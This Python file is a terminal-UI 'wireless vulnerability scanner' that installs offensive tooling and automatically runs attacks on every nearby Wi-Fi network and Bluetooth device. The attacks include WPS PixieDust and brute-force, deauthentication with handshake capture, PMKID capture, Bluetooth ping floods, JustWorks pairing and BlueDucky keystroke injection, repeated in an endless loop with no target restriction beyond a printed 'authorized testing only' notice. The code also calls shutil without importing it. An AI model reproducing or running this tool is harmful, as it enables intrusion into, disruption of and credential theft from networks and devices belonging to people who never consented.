import subprocess
import time
import logging
import re
import asyncio
import os
import sys
import argparse
from datetime import datetime
from textual.app import App, ComposeResult
from textual.widgets import Header, Footer, Button, Static, ListView, ListItem, Label
from textual.containers import Vertical, Horizontal
try:
    from bleak import BleakScanner, BleakClient
except ImportError:
    BleakScanner = None
    BleakClient = None

# Valid attack names
WIFI_ATTACKS = {"pixiedust", "bruteforce", "handshake", "pmkid", "wifite", "kismet"}
BLUETOOTH_ATTACKS = {"justworks", "dos", "blueducky", "kismet"}

class WirelessVulnScannerApp(App):
    """Textual app for running wireless vulnerability scans."""
    CSS = """
    Static#output {
        height: 20;
        border: tall white;
        overflow: auto;
    }
    Button {
        margin: 1;
    }
    ListView {
        height: auto;
        max-height: 10;
    }
    """

    def __init__(self, wifi_iface, selected_attacks, run_wifi, run_bluetooth):
        super().__init__()
        self.wifi_iface = wifi_iface
        self.selected_attacks = selected_attacks
        self.run_wifi = run_wifi
        self.run_bluetooth = run_bluetooth
        self.output = []
        self.devices = []
        self.networks = {"wps": [], "wpa": []}
        self.queue = []
        self.running = False

    def compose(self) -> ComposeResult:
        yield Header(show_clock=True)
        yield Vertical(
            Horizontal(
                Button("Run All (God Mode)", id="god_mode"),
                Button("Run Wi-Fi Only", id="wifi_only"),
                Button("Run Bluetooth Only", id="bluetooth_only"),
                Button("Run Queue", id="run_queue"),
                Button("Clear Queue", id="clear_queue"),
            ),
            ListView(id="attack_list"),
            Static(id="output", markup=True),
        )
        yield Footer()

    def on_mount(self):
        self.update_output("Wireless Vulnerability Scanner - For authorized testing only\n")
        self.update_output("Ensure you have permission to scan and test devices/networks.\n")
        self.update_output(f"Logging to wireless_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log\n")
        self.update_attack_list()

    def update_output(self, text):
        self.output.append(text)
        if len(self.output) > 100:
            self.output = self.output[-100:]
        self.query_one("#output", Static).update("\n".join(self.output))
        logging.info(text.strip())

    def update_attack_list(self):
        attack_list = self.query_one("#attack_list", ListView)
        attack_list.clear()
        if self.run_wifi:
            for attack in WIFI_ATTACKS:
                if not self.selected_attacks or attack in self.selected_attacks:
                    attack_list.append(ListItem(Label(f"Wi-Fi: {attack}"), id=f"wifi_{attack}"))
        if self.run_bluetooth:
            for attack in BLUETOOTH_ATTACKS:
                if not self.selected_attacks or attack in self.selected_attacks:
                    attack_list.append(ListItem(Label(f"Bluetooth: {attack}"), id=f"bluetooth_{attack}"))

    async def on_button_pressed(self, event: Button.Pressed):
        if self.running:
            return
        self.running = True
        try:
            if event.button.id == "god_mode":
                self.queue = [
                    f"{attack_type}_{attack}"
                    for attack_type, attacks in [("wifi", WIFI_ATTACKS), ("bluetooth", BLUETOOTH_ATTACKS)]
                    for attack in attacks
                    if not self.selected_attacks or attack in self.selected_attacks
                ]
                await self.run_queue()
            elif event.button.id == "wifi_only":
                self.queue = [f"wifi_{attack}" for attack in WIFI_ATTACKS if not self.selected_attacks or attack in self.selected_attacks]
                await self.run_queue()
            elif event.button.id == "bluetooth_only":
                self.queue = [f"bluetooth_{attack}" for attack in BLUETOOTH_ATTACKS if not self.selected_attacks or attack in self.selected_attacks]
                await self.run_queue()
            elif event.button.id == "run_queue":
                await self.run_queue()
            elif event.button.id == "clear_queue":
                self.queue = []
                self.update_output("Queue cleared.\n")
        finally:
            self.running = False

    async def on_list_view_selected(self, event: ListView.Selected):
        if self.running:
            return
        self.queue.append(event.item.id)
        self.update_output(f"Added {event.item.id} to queue.\n")

    async def run_queue(self):
        self.update_output("Running queue...\n")
        for attack in self.queue:
            attack_type, attack_name = attack.split("_", 1)
            self.update_output(f"Executing {attack_type} attack: {attack_name}\n")
            if attack_type == "wifi":
                await self.run_wifi_attack(attack_name)
            elif attack_type == "bluetooth":
                await self.run_bluetooth_attack(attack_name)
        self.update_output("Queue completed.\n")

    async def run_wifi_attack(self, attack):
        if not self.networks["wps"] and not self.networks["wpa"]:
            self.networks = discover_wifi_networks(self.wifi_iface)
        if attack in {"pixiedust", "bruteforce"}:
            for network in self.networks["wps"]:
                attempt_wps_attacks(self.wifi_iface, network, {attack})
        elif attack in {"handshake", "pmkid"}:
            for network in self.networks["wpa"]:
                attempt_wpa_attacks(self.wifi_iface, network, {attack})
        elif attack == "wifite":
            attempt_wifite_attack(self.wifi_iface)
        elif attack == "kismet":
            attempt_kismet_wifi_scan(self.wifi_iface)

    async def run_bluetooth_attack(self, attack):
        if not self.devices:
            classic_devices = discover_classic_devices()
            ble_devices = await discover_ble_devices()
            self.devices = classic_devices + ble_devices
        for device in self.devices:
            mac = device["mac"]
            name = device["name"]
            device_type = device["type"]
            self.update_output(f"Testing {device_type} device: {name} ({mac})\n")
            if device_type == "classic":
                enumerate_classic_services(mac)
            else:
                await enumerate_ble_services(mac)
            if attack == "dos":
                attempt_dos(mac, device_type)
            elif attack == "justworks" and device_type == "classic":
                attempt_justworks_pairing(mac)
            elif attack == "blueducky":
                run_blueducky(mac)
            elif attack == "kismet":
                attempt_kismet_bluetooth_scan()

def run_command(command, timeout=30):
    """Execute a shell command and return output."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        logging.error(f"Command timed out: {command}")
        return "", "Timeout"
    except Exception as e:
        logging.error(f"Command failed: {command}, Error: {str(e)}")
        return "", str(e)

def install_dependencies():
    """Install required dependencies."""
    if os.geteuid() != 0:
        print("Error: Must run as root to install dependencies.")
        sys.exit(1)

    # Ensure paru is installed
    if not shutil.which("paru"):
        run_command("pacman -S --needed base-devel git")
        run_command("git clone https://aur.archlinux.org/paru.git")
        run_command("cd paru && makepkg -si --noconfirm && cd .. && rm -rf paru")

    # Install Arch packages
    run_command("paru -S --needed bluez bluez-utils python bettercap aircrack-ng reaver bully hcxdumptool wifite kismet")

    # Install AUR packages
    if not run_command("paru -Qs python-pybluez")[0]:
        if not run_command("paru -S --needed python-pybluez")[0]:
            run_command("git clone https://github.com/pybluez/pybluez.git")
            run_command("cd pybluez && python setup.py install && cd .. && rm -rf pybluez")
    if not run_command("paru -Qs python-bleak")[0]:
        run_command("paru -S --needed python-bleak")

    # Install textual
    run_command("python3 -m pip install textual")

    # Clone BlueDucky
    if not os.path.isdir("BlueDucky"):
        run_command("git clone https://github.com/pentestfunctions/BlueDucky.git")
        run_command("cd BlueDucky && python3 -m pip install -r requirements.txt && cd ..")
    if os.path.isfile("BlueDucky/main.py"):
        run_command("chmod +x BlueDucky/main.py")

def setup_wifi_interface():
    """Detect and set Wi-Fi interface to monitor mode."""
    stdout, stderr = run_command("iw dev")
    if stderr:
        print(f"Error detecting Wi-Fi interface: {stderr}")
        sys.exit(1)
    match = re.search(r"Interface (\w+)", stdout)
    if not match:
        print("Error: No Wi-Fi interface found.")
        sys.exit(1)
    wifi_iface = match.group(1)
    run_command(f"airmon-ng start {wifi_iface}")
    stdout, stderr = run_command("iw dev")
    monitor_iface = re.search(r"Interface (\w*mon)", stdout)
    return monitor_iface.group(1) if monitor_iface else wifi_iface

def cleanup_wifi_interface(iface):
    """Set Wi-Fi interface back to managed mode."""
    run_command(f"airmon-ng stop {iface}")

def discover_classic_devices():
    """Discover Bluetooth Classic devices using bluetoothctl."""
    logging.info("Starting Bluetooth Classic device discovery...")
    devices = []
    run_command("hciconfig hci0 up")
    run_command("hciconfig hci0 piscan")
    run_command("echo -e 'scan on\n' | bluetoothctl", timeout=10)
    time.sleep(5)
    stdout, stderr = run_command("echo -e 'devices\n' | bluetoothctl")
    run_command("echo -e 'scan off\n' | bluetoothctl")
    
    if stderr:
        logging.error(f"Classic discovery error: {stderr}")
        return devices

    for line in stdout.splitlines():
        if re.match(r"Device ([0-9A-F:]{17}) (.+)", line):
            mac, name = re.match(r"Device ([0-9A-F:]{17}) (.+)", line).groups()
            devices.append({"mac": mac, "name": name, "type": "classic"})
            logging.info(f"Found classic device: {name} ({mac})")
    return devices

async def discover_ble_devices():
    """Discover BLE devices using bleak."""
    if BleakScanner is None:
        logging.error("Bleak not installed. Skipping BLE discovery.")
        return []
    devices = []
    logging.info("Starting BLE device discovery...")
    try:
        ble_devices = await BleakScanner.discover(timeout=5.0)
        for device in ble_devices:
            devices.append({"mac": device.address, "name": device.name or "Unknown", "type": "ble"})
            logging.info(f"Found BLE device: {device.name or 'Unknown'} ({device.address})")
    except Exception as e:
        logging.error(f"BLE discovery error: {str(e)}")
    return devices

def enumerate_classic_services(mac):
    """Enumerate services on a Bluetooth Classic device."""
    logging.info(f"Enumerating classic services for {mac}...")
    stdout, stderr = run_command(f"echo -e 'info {mac}\n' | bluetoothctl")
    if stderr:
        logging.error(f"Classic service enumeration failed for {mac}: {stderr}")
    else:
        logging.info(f"Classic device info for {mac}:\n{stdout}")

async def enumerate_ble_services(mac):
    """Enumerate GATT services on a BLE device."""
    if BleakClient is None:
        logging.error("Bleak not installed. Skipping BLE service enumeration.")
        return
    logging.info(f"Enumerating BLE services for {mac}...")
    try:
        async with BleakClient(mac, timeout=20.0) as client:
            services = await client.get_services()
            for service in services:
                logging.info(f"BLE Service for {mac}: {service}")
                for char in service.characteristics:
                    logging.info(f"  Characteristic: {char.uuid}, Properties: {char.properties}")
    except Exception as e:
        logging.error(f"BLE service enumeration failed for {mac}: {str(e)}")

def attempt_dos(mac, device_type):
    """Attempt a DoS attack using l2ping for Classic or bettercap for both."""
    logging.info(f"Attempting DoS on {mac} ({device_type})...")
    if device_type == "classic":
        stdout, stderr = run_command(f"l2ping -s 600 -c 10 {mac}")
        if stderr:
            logging.error(f"DoS failed for {mac}: {stderr}")
        else:
            logging.info(f"DoS attempt on {mac} completed.")
    stdout, stderr = run_command(f"bettercap -eval 'ble.recon on; ble.enum {mac}; ble.recon off'")
    if stderr:
        logging.error(f"Bettercap DoS failed for {mac}: {stderr}")
    else:
        logging.info(f"Bettercap DoS attempt on {mac} completed.")

def attempt_justworks_pairing(mac):
    """Attempt JustWorks pairing vulnerability."""
    logging.info(f"Attempting JustWorks pairing on {mac}...")
    run_command("hciconfig hci0 piscan")
    run_command("hciconfig hci0 auth")
    stdout, stderr = run_command(f"echo -e 'pair {mac}\n' | bluetoothctl")
    if "Pairing successful" in stdout:
        logging.info(f"JustWorks pairing successful on {mac}")
        stdout, stderr = run_command(f"echo -e 'connect {mac}\n' | bluetoothctl")
        if "Connection successful" in stdout:
            logging.info(f"Connected to {mac}")
        else:
            logging.error(f"Connection failed for {mac}: {stderr}")
    else:
        logging.error(f"Pairing failed for {mac}: {stderr}")

def run_blueducky(mac):
    """Run BlueDucky for HID injection attack."""
    logging.info(f"Attempting BlueDucky attack on {mac}...")
    if not os.path.isfile("BlueDucky/main.py"):
        logging.error("BlueDucky not found. Skipping attack.")
        return
    stdout, stderr = run_command(f"python3 BlueDucky/main.py {mac}")
    if stderr:
        logging.error(f"BlueDucky attack failed for {mac}: {stderr}")
    else:
        logging.info(f"BlueDucky attack on {mac}:\n{stdout}")

def discover_wifi_networks(iface):
    """Discover Wi-Fi networks with WPS or WPA using wash and airodump-ng."""
    logging.info(f"Scanning Wi-Fi networks on {iface}...")
    networks = {"wps": [], "wpa": []}
    
    # WPS scan with wash
    stdout, stderr = run_command(f"wash -i {iface} -s", timeout=30)
    if stderr:
        logging.error(f"WPS scan error: {stderr}")
    else:
        for line in stdout.splitlines():
            if re.match(r"([0-9A-F:]{17})\s+([0-9]+)\s+(-?[0-9]+)\s+([0-9.]+)\s+([0-9]+)\s+(.+?)\s+(Yes|No)", line):
                bssid, channel, rssi, wps_version, wps_state, essid, wps_locked = re.match(
                    r"([0-9A-F:]{17})\s+([0-9]+)\s+(-?[0-9]+)\s+([0-9.]+)\s+([0-9]+)\s+(.+?)\s+(Yes|No)", line).groups()
                if wps_locked == "No":
                    networks["wps"].append({"bssid": bssid, "essid": essid.strip(), "channel": channel})
                    logging.info(f"Found WPS-enabled network: {essid} ({bssid}, Channel {channel})")

    # WPA scan with airodump-ng
    stdout, stderr = run_command(f"airodump-ng --encrypt WPA -w wifi_scan --output-format csv {iface}", timeout=30)
    if stderr:
        logging.error(f"WPA scan error: {stderr}")
    else:
        for line in stdout.splitlines():
            if re.match(r"([0-9A-F:]{17}),.*?,([0-9]+),.*?WPA.*?,(.+?),.*?,([0-9]+)", line):
                bssid, channel, essid, clients = re.match(
                    r"([0-9A-F:]{17}),.*?,([0-9]+),.*?WPA.*?,(.+?),.*?,([0-9]+)", line).groups()
                if int(clients) > 0:
                    networks["wpa"].append({"bssid": bssid, "essid": essid.strip(), "channel": channel})
                    logging.info(f"Found WPA network with clients: {essid} ({bssid}, Channel {channel})")
    
    return networks

def attempt_wps_attacks(iface, network, selected_attacks):
    """Attempt WPS attacks (PixieDust, brute-force) using reaver and bully."""
    bssid = network["bssid"]
    essid = network["essid"]
    channel = network["channel"]
    logging.info(f"Attempting WPS attacks on {essid} ({bssid})...")
    
    run_command(f"iwconfig {iface} channel {channel}")
    
    if "pixiedust" in selected_attacks:
        stdout, stderr = run_command(f"reaver -i {iface} -b {bssid} -c {channel} -vv -K 1", timeout=60)
        if stderr:
            logging.error(f"PixieDust attack failed for {bssid}: {stderr}")
        else:
            logging.info(f"PixieDust attack on {bssid}:\n{stdout}")
    
    if "bruteforce" in selected_attacks:
        stdout, stderr = run_command(f"bully -b {bssid} -c {channel} -i {iface} -v 3", timeout=60)
        if stderr:
            logging.error(f"Bully attack failed for {bssid}: {stderr}")
        else:
            logging.info(f"Bully attack on {bssid}:\n{stdout}")

def attempt_wpa_attacks(iface, network, selected_attacks):
    """Attempt WPA handshake or PMKID capture."""
    bssid = network["bssid"]
    essid = network["essid"]
    channel = network["channel"]
    logging.info(f"Attempting WPA attacks on {essid} ({bssid})...")
    
    run_command(f"iwconfig {iface} channel {channel}")
    
    if "handshake" in selected_attacks:
        logging.info(f"Capturing handshake for {bssid} (150 seconds)...")
        handshake_file = f"handshake_{bssid.replace(':', '')}.cap"
        deauth = subprocess.Popen(f"aireplay-ng -0 10 -a {bssid} {iface}", shell=True)
        stdout, stderr = run_command(f"airodump-ng --bssid {bssid} -c {channel} -w {handshake_file} --output-format pcap {iface}", timeout=150)
        deauth.terminate()
        if stderr:
            logging.error(f"Handshake capture failed for {bssid}: {stderr}")
        else:
            logging.info(f"Handshake capture for {bssid} completed.")
    
    if "pmkid" in selected_attacks:
        logging.info(f"Capturing PMKID for {bssid} (60 seconds)...")
        pmkid_file = f"pmkid_{bssid.replace(':', '')}.cap"
        stdout, stderr = run_command(f"hcxdumptool -i {iface} -o {pmkid_file} --enable_status=1", timeout=60)
        if stderr:
            logging.error(f"PMKID capture failed for {bssid}: {stderr}")
        else:
            logging.info(f"PMKID capture for {bssid} completed.")

def attempt_wifite_attack(iface):
    """Run wifite for automated Wi-Fi attacks."""
    logging.info(f"Running wifite on {iface}...")
    stdout, stderr = run_command(f"wifite --no-wps --no-wep -i {iface} --kill", timeout=300)
    if stderr:
        logging.error(f"Wifite attack failed: {stderr}")
    else:
        logging.info(f"Wifite attack completed:\n{stdout}")

def attempt_kismet_wifi_scan(iface):
    """Run kismet for passive Wi-Fi scanning."""
    logging.info(f"Running kismet Wi-Fi scan on {iface}...")
    stdout, stderr = run_command(f"kismet -c {iface} --silent", timeout=60)
    if stderr:
        logging.error(f"Kismet Wi-Fi scan failed: {stderr}")
    else:
        logging.info(f"Kismet Wi-Fi scan completed:\n{stdout}")

def attempt_kismet_bluetooth_scan():
    """Run kismet for passive Bluetooth scanning."""
    logging.info("Running kismet Bluetooth scan...")
    stdout, stderr = run_command("kismet -c bluetooth", timeout=60)
    if stderr:
        logging.error(f"Kismet Bluetooth scan failed: {stderr}")
    else:
        logging.info(f"Kismet Bluetooth scan completed:\n{stdout}")

def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Wireless Vulnerability Scanner - For authorized testing only\n"
                    "Run in TUI mode by default, or use command-line options for non-interactive mode.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "--wifi",
        action="store_true",
        help="Run Wi-Fi attacks only (pixiedust, bruteforce, handshake, pmkid, wifite, kismet)"
    )
    parser.add_argument(
        "--bluetooth",
        action="store_true",
        help="Run Bluetooth/BLE attacks only (justworks, dos, blueducky, kismet)"
    )
    parser.add_argument(
        "--attacks",
        help="Comma-separated list of attacks to run (e.g., 'pixiedust,handshake' or 'justworks,dos')"
    )
    parser.add_argument(
        "--no-tui",
        action="store_true",
        help="Run in non-interactive mode (requires --wifi or --bluetooth)"
    )
    args = parser.parse_args()

    if not args.wifi and not args.bluetooth and not args.no_tui:
        args.wifi = args.bluetooth = True  # Default to both in TUI mode

    selected_attacks = set()
    if args.attacks:
        selected_attacks = set(args.attacks.split(","))
        invalid_attacks = selected_attacks - (WIFI_ATTACKS | BLUETOOTH_ATTACKS)
        if invalid_attacks:
            print(f"Error: Invalid attacks: {invalid_attacks}")
            print("Valid Wi-Fi attacks:", ", ".join(WIFI_ATTACKS))
            print("Valid Bluetooth attacks:", ", ".join(BLUETOOTH_ATTACKS))
            sys.exit(1)
        if args.wifi and not selected_attacks & WIFI_ATTACKS:
            print("Error: --wifi specified but no valid Wi-Fi attacks in --attacks.")
            sys.exit(1)
        if args.bluetooth and not selected_attacks & BLUETOOTH_ATTACKS:
            print("Error: --bluetooth specified but no valid Bluetooth attacks in --attacks.")
            sys.exit(1)

    if args.no_tui and not (args.wifi or args.bluetooth):
        print("Error: --no-tui requires --wifi, --bluetooth, or both.")
        parser.print_help()
        sys.exit(1)

    return args, selected_attacks

async def non_interactive_mode(wifi_iface, args, selected_attacks):
    """Run attacks in non-interactive mode."""
    print("Wireless Vulnerability Scanner - For authorized testing only")
    print("Ensure you have permission to scan and test devices/networks.")
    print(f"Logging results to wireless_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
    
    while True:
        devices = []
        networks = {"wps": [], "wpa": []}
        
        if args.bluetooth:
            classic_devices = discover_classic_devices()
            ble_devices = await discover_ble_devices()
            devices = classic_devices + ble_devices
            
            for device in devices:
                mac = device["mac"]
                name = device["name"]
                device_type = device["type"]
                print(f"Testing {device_type} device: {name} ({mac})")
                
                if device_type == "classic":
                    enumerate_classic_services(mac)
                else:
                    await enumerate_ble_services(mac)
                
                if not selected_attacks or "dos" in selected_attacks:
                    attempt_dos(mac, device_type)
                if device_type == "classic" and (not selected_attacks or "justworks" in selected_attacks):
                    attempt_justworks_pairing(mac)
                if not selected_attacks or "blueducky" in selected_attacks:
                    run_blueducky(mac)
                if not selected_attacks or "kismet" in selected_attacks:
                    attempt_kismet_bluetooth_scan()
        
        if args.wifi:
            networks = discover_wifi_networks(wifi_iface)
            for network in networks["wps"]:
                attempt_wps_attacks(wifi_iface, network, selected_attacks or WIFI_ATTACKS)
            for network in networks["wpa"]:
                attempt_wpa_attacks(wifi_iface, network, selected_attacks or WIFI_ATTACKS)
            if not selected_attacks or "wifite" in selected_attacks:
                attempt_wifite_attack(wifi_iface)
            if not selected_attacks or "kismet" in selected_attacks:
                attempt_kismet_wifi_scan(wifi_iface)
        
        if not devices and not networks["wps"] and not networks["wpa"]:
            logging.info("No devices or networks found. Waiting 30 seconds before retrying...")
            print("No devices or networks found. Retrying in 30 seconds...")
            time.sleep(30)
            continue
        
        logging.info("Completed scan cycle. Waiting 30 seconds before next scan...")
        print("Completed scan cycle. Waiting 30 seconds...")
        time.sleep(30)

if __name__ == "__main__":
    # Set up logging
    logging.basicConfig(
        filename=f"wireless_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log",
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )
    
    args, selected_attacks = parse_arguments()
    
    # Install dependencies
    install_dependencies()
    
    # Set up Wi-Fi interface
    wifi_iface = setup_wifi_interface() if args.wifi or not args.no_tui else None
    
    try:
        if args.no_tui:
            asyncio.run(non_interactive_mode(wifi_iface, args, selected_attacks))
        else:
            app = WirelessVulnScannerApp(wifi_iface, selected_attacks, args.wifi, args.bluetooth)
            app.run()
    except KeyboardInterrupt:
        print("\nScript terminated by user.")
        logging.info("Script terminated by user.")
        run_command("echo -e 'scan off\n' | bluetoothctl")
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        logging.error(f"Script error: {str(e)}")
        run_command("echo -e 'scan off\n' | bluetoothctl")
    finally:
        if wifi_iface:
            cleanup_wifi_interface(wifi_iface)